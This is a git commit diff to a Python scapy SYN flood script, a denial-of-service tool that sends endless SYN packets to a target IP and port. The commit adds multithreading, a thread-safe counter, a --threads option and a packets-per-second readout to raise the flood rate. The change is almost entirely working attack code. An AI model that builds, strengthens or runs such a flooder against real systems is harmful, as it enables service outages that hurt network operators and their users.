65df46969260288e5d9a6b6e9b949d9f3d68f84d
Taylor <tli@cloudtrace.com.au>
2022-03-21 11:39:26 +1100

    Multi-thread packet-sending

--- py3_synflood_cmd.py
+++ py3_synflood_cmd.py
@@ -7,6 +7,27 @@ from sys import stdout
 from scapy.all import *
 from random import randint
 from argparse import ArgumentParser
+import threading, time
+
+class Counter(object):
+	def __init__(self):
+		self.lock = threading.Lock()
+		self.value = 0
+
+	def inc(self):
+		with self.lock:
+			self.value += 1
+
+	def reset(self):
+		with self.lock:
+			v = self.value
+			self.value = 0
+			return v
+
+counter = Counter()
+
+
+
 
 
 def randomIP():
@@ -21,7 +42,7 @@ def randInt():
 
 def SYN_Flood(dstIP, srcIP, dstPort):
 	#total = 0
-	print ("Packets are sending ...")
+	global counter
 
 	#for x in range (0, counter):
 	while True:
@@ -42,7 +63,7 @@ def SYN_Flood(dstIP, srcIP, dstPort):
 		TCP_Packet.window = w_indow
 
 		send(IP_Packet/TCP_Packet, verbose=0)
-		#total+=1
+		counter.inc()
 
 	#stdout.write("\rTotal packets sent: %i\n" % total)
 
@@ -53,19 +74,31 @@ def main():
 	parser.add_argument('--port', '-p', help='target port number')
 	#parser.add_argument('--count', '-c', help='number of packets')
 	parser.add_argument('--source', '-s', help='source IP address')
+	parser.add_argument('--threads', '-d', help='number of threads')
 	parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
 	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1"
 
 	args = parser.parse_args()
 
+	global counter
+
 	if args.target is not None:
 		if args.port is not None:
-			#if args.count is None:
-			#	print('[!]You did not use --counter/-c parameter, so 1 packet will be sent..')
-			#	SYN_Flood(args.target, args.port, 1)
 
-			#else:
-			SYN_Flood(args.target, args.source, args.port)
+			# Start flooding with multiple threads
+			#SYN_Flood(args.target, args.source, args.port)
+			print ("Packets are sending ...")
+			for _ in range(int(args.threads)):
+				t = threading.Thread(target=SYN_Flood, args=(args.target, args.source, args.port))
+				t.start()
+				# t.join()
+
+
+			while True:
+				print('\r%i pkt/s'% counter.reset(), end='' )
+				time.sleep(1)
+
+
 
 		else:
 			print('[-]Please, use --port/-p to give target\'s port!')
@@ -74,15 +107,15 @@ def main():
 			exit()
 	else:
 		print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
-                           [--count COUNT] [--version]
+						   [--count COUNT] [--version]
 optional arguments:
-  -h, --help            show this help message and exit
+  -h, --help			show this help message and exit
   --target TARGET, -t TARGET
-                        target IP address
+						target IP address
   --port PORT, -p PORT  target port number
   --count COUNT, -c COUNT
-                        number of packets
-  --version, -v         show program's version number and exit''')
+						number of packets
+  --version, -v		 show program's version number and exit''')
 		exit()
 
 main()
